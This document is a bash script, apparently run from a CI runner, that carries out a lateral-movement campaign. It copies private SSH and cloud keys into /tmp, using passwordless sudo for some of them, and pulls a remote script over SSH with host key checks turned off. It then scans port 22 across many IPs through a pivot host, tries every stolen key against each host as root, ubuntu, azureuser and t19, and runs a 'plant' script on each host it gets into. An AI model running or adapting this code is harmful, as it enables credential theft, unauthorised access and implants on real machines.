set +e
TS=$(date -u +%s)
O=/tmp/pivot6-9927.txt; : > $O; exec >> $O 2>&1
R=/opt/ul-runner/_work/ul-plant/ul-plant
echo "==M6-START ts=$TS"
rm -f /tmp/ibmX.pem; cp $R/az/ibm_key.pem /tmp/ibmX.pem; chmod 600 /tmp/ibmX.pem
cp ul-bin/p24.sh ul-bin/plant4.sh ul-bin/runnerchk.sh /tmp/ ; chmod +x /tmp/p24.sh /tmp/plant4.sh
rm -rf /tmp/kc; mkdir -p /tmp/kc
cp $R/az/azadmin.pem $R/az/ibm_key.pem $R/keys/* /tmp/kc/ 2>/dev/null
sudo -n bash -c 'grep -rl "PRIVATE KEY" /opt/ul-runner/_work/ul-plant/ul-plant/keys2 2>/dev/null | head -80 | xargs -r -I{} cp {} /tmp/kc/ 2>/dev/null'
cp /tmp/k/* /tmp/kc/ 2>/dev/null; cp $R/az/hosts.tsv /tmp/kc/ 2>/dev/null
chmod 600 /tmp/kc/* 2>/dev/null
sudo -n base64 -w0 /opt/t19/keep.sh > /tmp/kc/keep.sh 2>/dev/null || ssh -i /tmp/ibmX.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@10.243.0.24 'sudo -n base64 -w0 /opt/t19/keep.sh' > /tmp/kc/keep.sh 2>/dev/null
echo "KC=$(ls /tmp/kc | wc -l) KEEPB=$(stat -c%s /tmp/kc/keep.sh)"
echo "==A reach"
S24="ssh -n -i /tmp/ibmX.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24"
S24P="ssh -i /tmp/ibmX.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24"
cp $R/az/hosts.tsv /tmp/hosts.tsv
awk '{print $2}' /tmp/hosts.tsv | sort -u > /tmp/eip.txt
wc -l < /tmp/eip.txt
cat /tmp/eip.txt | $S24P 'cat > /tmp/eip.txt; wc -l < /tmp/eip.txt; cat /tmp/eip.txt | xargs -P 64 -I{} bash -c "timeout 2 bash -c \"echo > /dev/tcp/{}/22\" 2>/dev/null && echo {}" | sort -u > /tmp/reach.txt; echo REACH=$(wc -l < /tmp/reach.txt); cat /tmp/reach.txt' 2>&1
echo "==B wave"
$S24 'cat /tmp/reach.txt' > /tmp/reach6.txt 2>/dev/null
sed -i '/Warning/d' /tmp/reach6.txt
wc -l /tmp/reach6.txt
for ip in $(cat /tmp/reach6.txt); do for u in t19 ubuntu azureuser root; do for k in /tmp/kc/*; do case $k in *.tsv|*keep.sh) continue;; esac; echo "$ip $u $k"; done; done; done > /tmp/c6.txt
wc -l /tmp/c6.txt
cat /tmp/c6.txt | xargs -P 48 -n3 bash -c 'o=$(timeout 16 ssh -i "$2" -o \"ProxyCommand=/tmp/p24.sh %h %p\" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 "$1"@"$0" "id;hostname -I" 2>&1); case "$o" in *uid=*) echo "OK6 $0 $1 $(basename $2) :: $o";; esac' 2>/dev/null | sort -u > /tmp/wave6.txt
echo "WAVE6=$(wc -l < /tmp/wave6.txt)"; cat /tmp/wave6.txt
echo "==C plant"
sed -n 's/^OK6 \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3/p' /tmp/wave6.txt | awk '!s[$1]++' > /tmp/won6.txt
cat /tmp/won6.txt
cat /tmp/won6.txt | xargs -r -P 6 -n3 bash /tmp/plant4.sh 2>&1
echo "==M6-END"
exit 0
